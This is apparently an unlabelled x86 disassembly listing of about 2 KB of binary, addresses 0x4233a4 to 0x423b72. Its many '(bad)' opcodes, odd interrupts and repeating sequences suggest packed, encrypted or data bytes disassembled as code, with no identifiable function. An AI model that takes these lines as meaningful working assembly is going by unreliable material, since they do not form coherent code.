  4233a4:	sub    BYTE PTR [ebx+0x13],dl
  4233a7:	xchg   ebx,edx
  4233a9:	int    0x8d
  4233ab:	std    
  4233ac:	inc    ebx
  4233ad:	rol    DWORD PTR [edx-0x2893219],cl
  4233b3:	or     dh,BYTE PTR [esi-0x53]
  4233b6:	int    0x76
  4233b8:	jne    0x4233c4
  4233ba:	jbe    0x42338c
  4233bc:	ret    
  4233bd:	dec    ecx
  4233be:	and    DWORD PTR [esi+0x45e60a35],eax
  4233c4:	leave  
  4233c5:	jbe    0x423364
  4233c7:	inc    ecx
  4233c8:	and    DWORD PTR [esi+0x4576cd35],eax
  4233ce:	int    0x8d
  4233d0:	inc    ebp
  4233d1:	cmp    eax,ebp
  4233d3:	cmp    ecx,DWORD PTR [edi]
  4233d5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233db:	push   ebx
  4233dc:	ror    DWORD PTR [edx],cl
  4233de:	jbe    0x423435
  4233e0:	int    0x76
  4233e2:	inc    ebp
  4233e3:	int    0x8d
  4233e5:	inc    ebp
  4233e6:	cmp    eax,ebp
  4233e8:	cmp    ecx,DWORD PTR [edi]
  4233ea:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233f0:	push   ebx
  4233f1:	ror    DWORD PTR [edx],cl
  4233f3:	jbe    0x42338a
  4233f5:	leave  
  4233f6:	jbe    0x423435
  4233f8:	dec    eax
  4233f9:	and    DWORD PTR [esi+0x1d76c935],eax
  4233ff:	ret    0x8621
  423402:	xor    eax,0xcd4576cd
  423407:	lea    eax,[ebp+0x3b]
  42340a:	lds    edi,FWORD PTR [ebx]
  42340c:	psrlq  mm6,mm2
  42340f:	sub    bl,dl
  423411:	mov    ebp,0xcdd35392
  423416:	lea    ebp,[ebp+0x52f7d43]
  42341c:	push   ss
  42341d:	xchg   DWORD PTR [eax-0x6d241480],eax
  423423:	add    BYTE PTR [eax-0x32c27233],0x76
  42342a:	cmp    eax,0x3b5596cd
  42342f:	jns    0x42346c
  423431:	or     al,0xd3
  423433:	lods   eax,DWORD PTR ds:[esi]
  423434:	sub    bl,dl
  423436:	jmp    0x4233ca
  423438:	push   ebx
  423439:	jge    0x423408
  42343b:	jbe    0x4233ea
  42343d:	xor    edx,edx
  42343f:	cmp    ebx,edx
  423441:	clc    
  423442:	add    cl,BYTE PTR [edx]
  423444:	jbe    0x4233db
  423446:	int    0x76
  423448:	sbb    eax,0x3b1d8dcd
  42344d:	lds    edi,FWORD PTR [ebx]
  42344f:	psrlq  mm6,mm2
  423452:	sub    bl,dl
  423454:	mov    ebp,0xcdd35392
  423459:	lea    edx,[ebp+0x16d87d43]
  42345f:	int    0x76
  423461:	sbb    eax,0x3b1d8dcd
  423466:	lds    edi,FWORD PTR [ebx]
  423468:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42346f:	push   ebx
  423470:	ror    DWORD PTR [edx],cl
  423472:	jbe    0x423409
  423474:	int    0x76
  423476:	cmp    eax,0x3b3d8dcd
  42347b:	lds    edi,FWORD PTR [ebx]
  42347d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423484:	push   ebx
  423485:	ror    ebp,cl
  423487:	lea    edx,[ebp+0xad3d12f]
  42348d:	jbe    0x423424
  42348f:	int    0x76
  423491:	inc    ebp
  423492:	int    0x8d
  423494:	inc    ebp
  423495:	cmp    eax,ebp
  423497:	cmp    ecx,DWORD PTR [edi]
  423499:	shl    edx,cl
  42349b:	sub    bl,dl
  42349d:	mov    ebp,0xcdd35392
  4234a2:	lea    edx,[ebp+0x52f7d43]
  4234a8:	pusha  
  4234a9:	xchg   edx,eax
  4234aa:	add    BYTE PTR [eax+0xa9576cd],0x76
  4234b1:	or     eax,0x875576cd
  4234b6:	jbe    0x423488
  4234b8:	or     ah,dh
  4234ba:	xchg   ebp,eax
  4234bb:	or     dh,BYTE PTR [esi+0x6d]
  4234be:	pop    ebp
  4234bf:	inc    ecx
  4234c0:	and    DWORD PTR [esi+0x5d760a35],eax
  4234c6:	leave  
  4234c7:	jbe    0x4234de
  4234c9:	cmp    DWORD PTR [ecx],esp
  4234cb:	xchg   BYTE PTR ds:0xb23576c9,dh
  4234d1:	and    DWORD PTR [esi-0xe89f5cb],eax
  4234d7:	int    0x76
  4234d9:	xchg   ebp,eax
  4234da:	int    0x8d
  4234dc:	xchg   ebp,eax
  4234dd:	cmp    eax,ebp
  4234df:	cmp    ecx,DWORD PTR [edi]
  4234e1:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234e7:	push   ebx
  4234e8:	ror    DWORD PTR [edx],cl
  4234ea:	jbe    0x423569
  4234ec:	int    0x6d
  4234ee:	jmp    0x4234f6
  4234f0:	add    DWORD PTR [eax-0x36923280],0x7006
  4234fa:	add    BYTE PTR [ebx],cl
  4234fc:	and    DWORD PTR [esi-0x369232cb],eax
  423502:	push   es
  423503:	xchg   esp,eax
  423504:	add    BYTE PTR [eax],al
  423506:	add    bh,dh
  423508:	and    DWORD PTR [esi-0x329232cb],eax
  42350e:	ins    DWORD PTR es:[edi],dx
  42350f:	int    0x76
  423511:	icebp  
  423512:	int    0x8d
  423514:	icebp  
  423515:	cmp    eax,ebp
  423517:	cmp    ecx,DWORD PTR [edi]
  423519:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42351f:	push   ebx
  423520:	ror    ebp,cl
  423522:	lea    edi,[ebp+0x2f]
  423525:	rcl    ebx,1
  423527:	int    0x8d
  423529:	ins    DWORD PTR es:[edi],dx
  42352a:	retf   0x8884
  42352d:	or     DWORD PTR [esi-0x57],esi
  423530:	int    0x6d
  423532:	int    0x76
  423534:	icebp  
  423535:	int    0x8d
  423537:	icebp  
  423538:	cmp    ecx,DWORD PTR [edi]
  42353a:	cmp    eax,ebp
  42353c:	shl    edx,cl
  42353e:	sub    bl,dl
  423540:	mov    ebp,0xcdd35392
  423545:	lea    edi,[ebp+0x2f]
  423548:	rcl    ebx,1
  42354a:	int    0x8d
  42354c:	adc    eax,0x3b1596cd
  423551:	or     al,0x3b
  423553:	cdq    
  423554:	shr    ebx,cl
  423556:	xchg   edx,eax
  423557:	shr    edx,cl
  423559:	sub    BYTE PTR [ebx+0x13],dl
  42355c:	xchg   ebx,edx
  42355e:	int    0x8d
  423560:	ins    DWORD PTR es:[edi],dx
  423561:	das    
  423562:	pop    ecx
  423563:	dec    esp
  423564:	mov    ch,cl
  423566:	push   es
  423567:	jo     0x423569
  423569:	add    BYTE PTR [eax],al
  42356b:	int    0x17
  42356d:	jo     0x42356f
  42356f:	add    BYTE PTR [eax],al
  423571:	cmp    eax,ebp
  423573:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423579:	jmp    0x2fd3:0x87d25328
  423580:	pop    ecx
  423581:	lea    ebp,[ecx-0x72f682c5]
  423587:	test   eax,0x76ca6dcd
  42358c:	test   eax,0xcdf18dcd
  423591:	xchg   esi,eax
  423592:	icebp  
  423593:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423596:	cdq    
  423597:	shr    edx,cl
  423599:	sub    bl,dl
  42359b:	jmp    0x42352f
  42359d:	push   ebx
  42359e:	adc    ecx,ebp
  4235a0:	xchg   esi,eax
  4235a1:	jge    0x4235d2
  4235a3:	rcl    DWORD PTR [ebx],1
  4235a5:	int    0x96
  4235a7:	ins    DWORD PTR es:[edi],dx
  4235a8:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235af:	icebp  
  4235b0:	int    0x8d
  4235b2:	icebp  
  4235b3:	cmp    eax,ebp
  4235b5:	cmp    ecx,DWORD PTR [edi]
  4235b7:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4235bd:	push   ebx
  4235be:	ror    ebp,cl
  4235c0:	lea    edi,[ebp+0x2f]
  4235c3:	rcl    ebx,1
  4235c5:	int    0x8d
  4235c7:	ins    DWORD PTR es:[edi],dx
  4235c8:	retf   0x8884
  4235cb:	or     DWORD PTR [esi-0x57],esi
  4235ce:	int    0x6d
  4235d0:	int    0x76
  4235d2:	icebp  
  4235d3:	int    0x8d
  4235d5:	icebp  
  4235d6:	cmp    eax,ebp
  4235d8:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4235de:	repnz sub BYTE PTR [ebx-0x2d],dl
  4235e2:	int    0x8d
  4235e4:	jge    0x423615
  4235e6:	rcl    ebx,1
  4235e8:	int    0x8d
  4235ea:	pop    ebp
  4235eb:	int    0x96
  4235ed:	pop    ebp
  4235ee:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235f1:	cdq    
  4235f2:	shr    ebx,cl
  4235f4:	xchg   edx,eax
  4235f5:	shr    edx,cl
  4235f7:	sub    BYTE PTR [ebx+0x13],dl
  4235fa:	xchg   ebx,edx
  4235fc:	int    0x8d
  4235fe:	ins    DWORD PTR es:[edi],dx
  4235ff:	das    
  423600:	pop    ecx
  423601:	dec    esp
  423602:	mov    ch,cl
  423604:	push   es
  423605:	xchg   esp,eax
  423606:	add    BYTE PTR [eax],al
  423608:	add    ch,cl
  42360a:	pop    ss
  42360b:	xchg   esp,eax
  42360c:	add    BYTE PTR [eax],al
  42360e:	add    BYTE PTR [ebx],bh
  423610:	lds    edi,FWORD PTR [ebx]
  423612:	cdq    
  423613:	sar    DWORD PTR [ebp+0x28ead392],cl
  423619:	push   ebx
  42361a:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423620:	test   eax,0x8d097d3b
  423625:	test   eax,0x76ca6dcd
  42362a:	test   eax,0xcdf18dcd
  42362f:	xchg   esi,eax
  423630:	icebp  
  423631:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423634:	cdq    
  423635:	shr    edx,cl
  423637:	sub    bl,dl
  423639:	jmp    0x4235cd
  42363b:	push   ebx
  42363c:	adc    ecx,ebp
  42363e:	xchg   esi,eax
  42363f:	jge    0x423670
  423641:	rcl    DWORD PTR [ebx],1
  423643:	int    0x96
  423645:	ins    DWORD PTR es:[edi],dx
  423646:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42364d:	xor    eax,0x3b358dcd
  423652:	(bad)  
  423654:	(bad)
  423657:	sub    bl,dl
  423659:	mov    ebp,0xcdd35392
  42365e:	lea    ebx,[ebp-0x33]
  423661:	xchg   esi,eax
  423662:	pop    ebp
  423663:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423666:	cdq    
  423667:	shr    ebx,cl
  423669:	xchg   edx,eax
  42366a:	shr    edx,cl
  42366c:	sub    BYTE PTR [ebx+0x13],dl
  42366f:	das    
  423670:	rcl    ebx,1
  423672:	xchg   DWORD PTR [esi+0x7d],esi
  423675:	or     dh,BYTE PTR [esi+0x7d]
  423678:	int    0x76
  42367a:	jge    0x423649
  42367c:	lea    ecx,ds:0xb2f7d43
  423682:	(bad)  
  423683:	inc    DWORD PTR [eax]
  423685:	add    ch,cl
  423687:	jbe    0x4236e6
  423689:	int    0x8d
  42368b:	pop    ebp
  42368c:	cmp    ecx,DWORD PTR [edi]
  42368e:	shl    edx,cl
  423690:	sub    BYTE PTR [ebx],bh
  423692:	(bad)
  423695:	xchg   edx,eax
  423696:	push   ebx
  423697:	ror    ebp,cl
  423699:	lea    ecx,ds:0xcdd3d12f
  42369f:	lea    edx,[ebp-0x142cf3c5]
  4236a5:	xchg   edx,eax
  4236a6:	push   ebx
  4236a7:	ror    ebp,cl
  4236a9:	lea    edx,[ebp-0xd2cf0c5]
  4236af:	sub    BYTE PTR [ebx-0x2d],dl
  4236b2:	or     dh,BYTE PTR [esi+0x35]
  4236b5:	int    0x76
  4236b7:	popf   
  4236b8:	int    0x8d
  4236ba:	popf   
  4236bb:	cmp    ecx,DWORD PTR [edi]
  4236bd:	shl    edx,cl
  4236bf:	sub    BYTE PTR [ebx],bh
  4236c1:	(bad)
  4236c4:	xchg   edx,eax
  4236c5:	push   ebx
  4236c6:	ror    ebp,cl
  4236c8:	lea    ebx,[ebp+0x3b9d96cd]
  4236ce:	or     al,0xd3
  4236d0:	jmp    0x423664
  4236d2:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4236d8:	adc    eax,DWORD PTR [edi+0x7d87358d]
  4236de:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  4236e4:	in     al,dx
  4236e5:	sbb    al,0xcd
  4236e7:	jbe    0x423686
  4236e9:	int    0x8d
  4236eb:	popf   
  4236ec:	cmp    eax,ebp
  4236ee:	cmp    ecx,DWORD PTR [edi]
  4236f0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4236f6:	push   ebx
  4236f7:	rol    DWORD PTR [edi+0x760a5576],cl
  4236fd:	push   ebp
  4236fe:	int    0x76
  423700:	popf   
  423701:	int    0x8d
  423703:	popf   
  423704:	cmp    eax,ebp
  423706:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42370c:	repnz sub BYTE PTR [ebx-0x2d],dl
  423710:	int    0x8d
  423712:	lods   eax,DWORD PTR ds:[esi]
  423713:	xor    edi,DWORD PTR [ebp-0x33]
  423716:	jbe    0x4236b5
  423718:	int    0x96
  42371a:	popf   
  42371b:	cmp    eax,ebp
  42371d:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  423723:	mov    ebp,0xcdd25392
  423728:	xchg   esi,eax
  423729:	push   ebp
  42372a:	das    
  42372b:	rcl    edx,1
  42372d:	inc    ebx
  42372e:	shr    DWORD PTR [edi],cl
  423730:	pop    es
  423731:	adc    ebp,edi
  423733:	add    BYTE PTR [eax],al
  423735:	int    0x76
  423737:	stc    
  423738:	int    0x76
  42373a:	stc    
  42373b:	int    0x76
  42373d:	std    
  42373e:	or     dh,BYTE PTR [esi+0x35]
  423741:	int    0x76
  423743:	mov    ch,cl
  423745:	lea    esp,ds:0x3b2596cd
  42374b:	or     al,0xd3
  42374d:	jmp    0x4236e1
  42374f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423755:	add    BYTE PTR [eax+0x5328ead3],0x13
  42375c:	jno    0x42372b
  42375e:	lea    esp,[ebp-0x33]
  423761:	xchg   esi,eax
  423762:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423766:	cdq    
  423767:	shr    ebx,cl
  423769:	xchg   edx,eax
  42376a:	shr    edx,cl
  42376c:	sub    BYTE PTR [ebx+0x13],dl
  42376f:	jno    0x42373e
  423771:	(bad)  
  423772:	stc    
  423773:	int    0x96
  423775:	stc    
  423776:	add    dh,dl
  423778:	xor    eax,0x993b0c3b
  42377d:	shr    ebx,cl
  42377f:	xchg   edx,eax
  423780:	shr    edx,cl
  423782:	sub    BYTE PTR [ebx+0x13],dl
  423785:	jno    0x423787
  423787:	jo     0x42379d
  423789:	int    0x8d
  42378b:	stc    
  42378c:	int    0x96
  42378e:	stc    
  42378f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423792:	cdq    
  423793:	shr    ebx,cl
  423795:	xchg   edx,eax
  423796:	shr    edx,cl
  423798:	sub    BYTE PTR [ebx+0x13],dl
  42379b:	or     dh,BYTE PTR [esi+0x65]
  42379e:	inc    ebx
  42379f:	jge    0x4237d0
  4237a1:	add    eax,0x808080ab
  4237a6:	int    0x76
  4237a8:	stc    
  4237a9:	in     al,dx
  4237aa:	(bad)  
  4237ab:	int    0x96
  4237ad:	or     dh,BYTE PTR gs:[esi-0x53]
  4237b1:	push   ecx
  4237b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237b3:	lods   eax,DWORD PTR ds:[esi]
  4237b4:	int    0x8d
  4237b6:	lods   eax,DWORD PTR ds:[esi]
  4237b7:	shr    ebx,cl
  4237b9:	xchg   edx,eax
  4237ba:	cmp    edi,DWORD PTR [ecx-0x2d]
  4237bd:	lods   eax,DWORD PTR ds:[esi]
  4237be:	sub    BYTE PTR [ebx-0x2d],dl
  4237c1:	int    0x8d
  4237c3:	jne    0x42378f
  4237c5:	dec    esp
  4237c6:	or     DWORD PTR [ecx],0x8dcd304c
  4237cc:	mov    ch,0xcd
  4237ce:	lea    esi,[ebp+0x3bb596cd]
  4237d4:	or     al,0x3b
  4237d6:	cdq    
  4237d7:	shr    edx,cl
  4237d9:	sub    bl,dl
  4237db:	jmp    0x42376f
  4237dd:	push   ebx
  4237de:	adc    ecx,ebp
  4237e0:	xchg   esi,eax
  4237e1:	mov    ch,0x87
  4237e3:	jge    0x4237b2
  4237e5:	jbe    0x423794
  4237e7:	cmp    edx,ebp
  4237e9:	add    al,0xad
  4237eb:	std    
  4237ec:	add    al,0xea
  4237ee:	std    
  4237ef:	shr    ebx,cl
  4237f1:	sub    BYTE PTR [edi+0x3bd353d2],al
  4237f7:	leave  
  4237f8:	int    0x8d
  4237fa:	std    
  4237fb:	int    0x96
  4237fd:	std    
  4237fe:	shr    edx,cl
  423800:	xchg   edx,eax
  423801:	shr    ebx,cl
  423803:	sub    BYTE PTR [ebx-0x1d],dl
  423806:	cmp    ebx,ecx
  423808:	inc    ebx
  423809:	rcl    dh,cl
  42380b:	mov    ds:0xcd8876cd,eax
  423810:	lea    ebp,ds:0xcd2d96cd
  423816:	add    DWORD PTR [ecx],edx
  423818:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423822:	shr    edx,cl
  423824:	sub    BYTE PTR [ebx+0x13],dl
  423827:	jno    0x4237f6
  423829:	(bad)  
  42382a:	stc    
  42382b:	int    0x96
  42382d:	stc    
  42382e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423831:	cdq    
  423832:	shr    ebx,cl
  423834:	xchg   edx,eax
  423835:	shr    edx,cl
  423837:	sub    BYTE PTR [ebx+0x13],dl
  42383a:	jno    0x42383c
  42383c:	(bad)  
  42383d:	jne    0x42383f
  42383f:	jo     0x42385d
  423841:	int    0x76
  423843:	or     dh,BYTE PTR gs:[esi+0x75]
  423847:	int    0x76
  423849:	xor    eax,0xcdfd760a
  42384e:	jbe    0x42384d
  423850:	cmp    ecx,ebx
  423852:	add    al,0xbd
  423854:	test   ah,dl
  423856:	xor    ecx,ebp
  423858:	jbe    0x4238cf
  42385a:	int    0x14
  42385c:	mov    ch,cl
  42385e:	jbe    0x4238d5
  423860:	int    0x84
  423862:	mov    BYTE PTR [ebx],bh
  423864:	jns    0x4238a1
  423866:	aad    0xd3
  423868:	lods   eax,DWORD PTR ds:[esi]
  423869:	sub    bl,dl
  42386b:	repz xchg edx,eax
  42386d:	push   ebx
  42386e:	ror    ch,cl
  423870:	xchg   esi,eax
  423871:	jne    0x42387d
  423873:	test   BYTE PTR [edx-0x33],cl
  423876:	jbe    0x423875
  423878:	add    al,0xd3
  42387a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423881:	xlat   BYTE PTR ds:[ebx]
  423882:	int    0x76
  423884:	std    
  423885:	cmp    ecx,ebx
  423887:	add    al,0xbd
  423889:	test   ah,dl
  42388b:	xor    ecx,ebp
  42388d:	jbe    0x423904
  42388f:	int    0x14
  423891:	mov    ch,cl
  423893:	jbe    0x42390a
  423895:	int    0x84
  423897:	mov    BYTE PTR [ebx],bh
  423899:	jns    0x4238d6
  42389b:	aad    0xd3
  42389d:	lods   eax,DWORD PTR ds:[esi]
  42389e:	sub    bl,dl
  4238a0:	repz xchg edx,eax
  4238a2:	push   ebx
  4238a3:	ror    ch,cl
  4238a5:	xchg   esi,eax
  4238a6:	jne    0x4238b2
  4238a8:	test   BYTE PTR [edx-0x33],cl
  4238ab:	jbe    0x4238aa
  4238ad:	add    al,0xd3
  4238af:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  4238b6:	xlat   BYTE PTR ds:[ebx]
  4238b7:	int    0x76
  4238b9:	jne    0x4238c5
  4238bb:	jbe    0x4238ca
  4238bd:	int    0x76
  4238bf:	mov    ch,0xcd
  4238c1:	lea    esi,[ebp+0xf3bc53b]
  4238c7:	shl    edx,cl
  4238c9:	sub    bl,dl
  4238cb:	mov    ebp,0xcdd35392
  4238d0:	(bad)  
  4238d1:	stc    
  4238d2:	or     dh,BYTE PTR [esi+0x25]
  4238d5:	leave  
  4238d6:	jbe    0x4238a4
  4238d8:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  4238df:	imul   edx,ebp,0x8d0a0c69
  4238e5:	gs adc bh,dl
  4238e8:	into   
  4238e9:	and    DWORD PTR [esi-0x32fad0cb],eax
  4238ef:	add    BYTE PTR [eax+0xd96cd80],0xcd
  4238f6:	sar    DWORD PTR [ebx],cl
  4238f8:	lds    ecx,FWORD PTR [edx]
  4238fa:	jbe    0x4238a9
  4238fc:	rol    esi,cl
  4238fe:	lods   eax,DWORD PTR ds:[esi]
  4238ff:	xchg   edx,eax
  423900:	or     dh,BYTE PTR [esi-0x30]
  423903:	int    0xd3
  423905:	cmp    edi,DWORD PTR [ecx-0x2d]
  423908:	lods   eax,DWORD PTR ds:[esi]
  423909:	sub    BYTE PTR [ebx+0x76],dl
  42390c:	lods   eax,DWORD PTR ds:[esi]
  42390d:	retf   0x858c
  423910:	int3   
  423911:	das    
  423912:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  42391d:	retf   
  42391e:	inc    ebx
  42391f:	rcl    esi,cl
  423921:	jle    0x4238f0
  423923:	jbe    0x4238da
  423925:	int    0x8d
  423927:	mov    ch,0xcd
  423929:	jbe    0x4238e0
  42392b:	int    0x96
  42392d:	mov    ch,0x3b
  42392f:	jns    0x42396c
  423931:	or     al,0xd3
  423933:	lods   eax,DWORD PTR ds:[esi]
  423934:	sub    bl,dl
  423936:	jmp    0x4238ca
  423938:	push   ebx
  423939:	jge    0x423908
  42393b:	jbe    0x4239a2
  42393d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423940:	lods   eax,DWORD PTR ds:[esi]
  423941:	sub    BYTE PTR [ebx+0x76],dl
  423944:	lods   eax,DWORD PTR ds:[esi]
  423945:	cmp    edx,ebp
  423947:	xchg   DWORD PTR [ebp-0x33],edi
  42394a:	jbe    0x42391c
  42394c:	add    al,0xea
  42394e:	std    
  42394f:	add    al,0xad
  423951:	std    
  423952:	shr    ebx,cl
  423954:	sub    BYTE PTR [edi+0x3b1353f1],al
  42395a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423961:	and    DWORD PTR [esi-0x323329cb],eax
  423967:	jbe    0x42398e
  423969:	in     al,dx
  42396a:	and    cl,ch
  42396c:	jbe    0x423967
  42396e:	int    0x8d
  423970:	stc    
  423971:	cmp    eax,ebp
  423973:	cmp    ecx,DWORD PTR [edi]
  423975:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42397b:	push   ebx
  42397c:	ror    ebp,cl
  42397e:	(bad)  
  42397f:	stc    
  423980:	int    0x96
  423982:	stc    
  423983:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423986:	cdq    
  423987:	shr    ebx,cl
  423989:	xchg   edx,eax
  42398a:	shr    edx,cl
  42398c:	sub    BYTE PTR [ebx+0x13],dl
  42398f:	inc    ebx
  423990:	jge    0x4239c1
  423992:	add    eax,0x80809223
  423997:	int    0x76
  423999:	or     eax,0xa886ccd
  42399e:	out    0xb5,al
  4239a0:	leave  
  4239a1:	jbe    0x4239c8
  4239a3:	mov    dl,0x21
  4239a5:	xchg   BYTE PTR ds:0x393576c9,dh
  4239ab:	and    DWORD PTR [esi-0x6a8936cb],eax
  4239b1:	dec    ecx
  4239b2:	mov    al,ds:0x76c93586
  4239b7:	lods   eax,DWORD PTR ds:[esi]
  4239b8:	imul   esp,DWORD PTR [ecx],0x76c93586
  4239be:	and    ch,BYTE PTR gs:[ebx-0x7a]
  4239c2:	xor    eax,0xcd3d760a
  4239c7:	jbe    0x423951
  4239c9:	int    0x8d
  4239cb:	lods   eax,DWORD PTR ds:[esi]
  4239cc:	int    0x96
  4239ce:	lods   eax,DWORD PTR ds:[esi]
  4239cf:	cmp    ecx,DWORD PTR [ebx+edx*8]
  4239d2:	jmp    0x423966
  4239d4:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4239da:	adc    esi,DWORD PTR [ecx-0x33]
  4239dd:	lea    edx,[ebp+0x3b9596cd]
  4239e3:	or     al,0xd3
  4239e5:	jmp    0x423979
  4239e7:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239ed:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239f4:	jno    0x4239c3
  4239f6:	lea    esp,[ebp-0x33]
  4239f9:	xchg   esi,eax
  4239fa:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4239fe:	cdq    
  4239ff:	shr    ebx,cl
  423a01:	xchg   edx,eax
  423a02:	shr    edx,cl
  423a04:	sub    BYTE PTR [ebx+0x13],dl
  423a07:	jno    0x4239d6
  423a09:	lea    esi,[ebp+0x3bb596cd]
  423a0f:	or     al,0x3b
  423a11:	cdq    
  423a12:	shr    ebx,cl
  423a14:	xchg   edx,eax
  423a15:	shr    edx,cl
  423a17:	sub    BYTE PTR [ebx+0x13],dl
  423a1a:	jno    0x423a1c
  423a1c:	jo     0x423a32
  423a1e:	or     dh,BYTE PTR [esi+0x65]
  423a21:	int    0x76
  423a23:	mov    ch,cl
  423a25:	lea    ebp,[ebp+0x3bad96cd]
  423a2b:	or     al,0xd3
  423a2d:	jmp    0x4239c1
  423a2f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423a35:	add    BYTE PTR [eax+0x5328ead3],0x13
  423a3c:	jno    0x423a0b
  423a3e:	lea    edx,[ebp+0x3b9596cd]
  423a44:	or     al,0x3b
  423a46:	cdq    
  423a47:	shr    ebx,cl
  423a49:	xchg   edx,eax
  423a4a:	shr    edx,cl
  423a4c:	sub    BYTE PTR [ebx+0x13],dl
  423a4f:	jno    0x423a1e
  423a51:	lea    esi,[ebp+0xb596cd]
  423a57:	(bad)  
  423a58:	cmp    eax,0x993b0c3b
  423a5d:	shr    ebx,cl
  423a5f:	xchg   edx,eax
  423a60:	shr    edx,cl
  423a62:	sub    BYTE PTR [ebx+0x13],dl
  423a65:	jno    0x423a67
  423a67:	jo     0x423a7d
  423a69:	int    0x8d
  423a6b:	mov    ch,0xa
  423a6d:	jbe    0x423a1c
  423a6f:	int    0x76
  423a71:	mov    ch,0x3b
  423a73:	or     al,0x3b
  423a75:	jns    0x423a4a
  423a77:	jmp    0x423a0b
  423a79:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a7f:	jbe    0x423ae6
  423a81:	inc    ebx
  423a82:	jge    0x423ab3
  423a84:	add    eax,0x8080853c
  423a89:	int    0x8d
  423a8b:	mov    ch,0xcd
  423a8d:	xchg   esi,eax
  423a8e:	mov    ch,0x3b
  423a90:	or     al,0x3b
  423a92:	cdq    
  423a93:	shr    ebx,cl
  423a95:	xchg   edx,eax
  423a96:	shr    edx,cl
  423a98:	sub    BYTE PTR [ebx+0x13],dl
  423a9b:	inc    ebx
  423a9c:	lea    ebp,[ebp-0x7ab2fad1]
  423aa2:	add    BYTE PTR [eax-0x32da7233],0x8d
  423aa9:	and    eax,0x192ebd3
  423aae:	add    ch,BYTE PTR [edi-0x723277f7]
  423ab4:	mov    ch,0xcd
  423ab6:	lea    esi,[ebp+0x192ebd3]
  423abc:	add    ch,BYTE PTR [edi-0x327e83f7]
  423ac2:	lea    esi,ds:0xd3358dcd
  423ac8:	jmp    0x423a5c
  423aca:	add    DWORD PTR [edx],eax
  423acc:	scas   eax,DWORD PTR es:[edi]
  423acd:	or     DWORD PTR [edx+edx*4+0x4],edi
  423ad1:	aaa    
  423ad2:	sbb    al,0x0
  423ad4:	add    BYTE PTR [eax],al
  423ad6:	add    BYTE PTR [edi+esi*1],0x24
  423ada:	add    BYTE PTR [eax],al
  423adc:	add    BYTE PTR [eax+0x24cfcf],al
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	jno    0x423ae6
  423ae6:	(bad)  
  423ae7:	cmp    eax,0x1ccfcf
  423aec:	add    BYTE PTR [eax],al
  423aee:	add    dh,dl
  423af0:	lods   eax,DWORD PTR ds:[esi]
  423af1:	jno    0x423ac0
  423af3:	lea    ecx,ds:0xcd4c9100
  423af9:	lea    esi,[ebp+0x4]
  423afc:	shl    DWORD PTR [eax],cl
  423afe:	jno    0x423b70
  423b00:	mov    ebp,0xefef
  423b05:	or     dh,BYTE PTR [esi-0x30]
  423b08:	int    0x76
  423b0a:	mov    ch,cl
  423b0c:	lea    ebp,ds:0xcd2d96cd
  423b12:	add    DWORD PTR [ecx],edx
  423b14:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423b1e:	shr    edx,cl
  423b20:	sub    BYTE PTR [ebx+0x13],dl
  423b23:	jno    0x423af2
  423b25:	lea    esi,[ebp+0x3bb596cd]
  423b2b:	or     al,0x3b
  423b2d:	cdq    
  423b2e:	shr    ebx,cl
  423b30:	xchg   edx,eax
  423b31:	shr    edx,cl
  423b33:	sub    BYTE PTR [ebx+0x13],dl
  423b36:	jno    0x423b38
  423b38:	(bad)  
  423b39:	add    BYTE PTR gs:[eax+0x1c],dh
  423b3d:	int    0x76
  423b3f:	rcl    bl,1
  423b41:	ins    DWORD PTR es:[edi],dx
  423b42:	xchg   edx,eax
  423b43:	cmp    ecx,ecx
  423b45:	inc    ebx
  423b46:	leave  
  423b47:	int    0x76
  423b49:	mov    ch,cl
  423b4b:	lea    ebp,ds:0x811101cd
  423b51:	add    BYTE PTR [eax-0x29d26933],0x54
  423b58:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b5b:	cdq    
  423b5c:	shr    ebx,cl
  423b5e:	xchg   edx,eax
  423b5f:	shr    edx,cl
  423b61:	sub    BYTE PTR [ebx+0x13],dl
  423b64:	jno    0x423b33
  423b66:	lea    esi,[ebp+0x3bb596cd]
  423b6c:	or     al,0x3b
  423b6e:	cdq    
  423b6f:	shr    ebx,cl
  423b71:	xchg   edx,eax
  423b72:	shr    edx,cl
